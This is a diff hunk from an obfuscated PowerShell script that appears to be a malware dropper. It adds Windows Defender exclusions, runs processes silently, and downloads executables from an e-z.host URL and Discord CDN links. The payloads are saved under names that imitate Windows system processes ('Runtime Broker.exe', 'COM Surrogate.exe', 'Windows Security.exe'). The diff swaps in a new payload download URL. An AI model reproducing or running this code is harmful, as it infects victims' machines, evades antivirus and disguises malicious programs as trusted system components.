@@ -393,7 +393,7 @@ function Main {
         Add-MpPreference -ExclusionPath $x82jdm *> $null 2>&1
         Start-Process -x82jdm $x82jdm -NoNewWindow -Wait -ErrorAction SilentlyContinue *> $null 2>&1
     }
-    xk7f1q1 -zx1ds "https://onedrive.live.com/download.aspx?cid=97860907e1ea7ff0&resid=97860907E1EA7FF0!113&parId=97860907E1EA7FF0!101&authkey=!ACaJl955WKnHmx8" -ak9zl1 "Runtime Broker.exe"
+    xk7f1q1 -zx1ds "https://r2.e-z.host/fbb8540a-d344-42ba-8e24-ff0ee16b1e7d/99tyvmq7j1mcj7by2o.exe" -ak9zl1 "Runtime Broker.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317064226329722900/COM_Surrogate.exe?ex=675d5325&is=675c01a5&hm=27aff13cbe0e0206758c9b48cd37bf161fff2c041ace7fe97ca46f9f0d074568&" -ak9zl1 "COM Surrogate.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317064215881711676/Windows_Security.exe?ex=675d5322&is=675c01a2&hm=281e33474de3ea98fce5e4813b7e8172e62a8eaf9eee26b9707303e99425821d&" -ak9zl1 "Windows Security.exe"
 
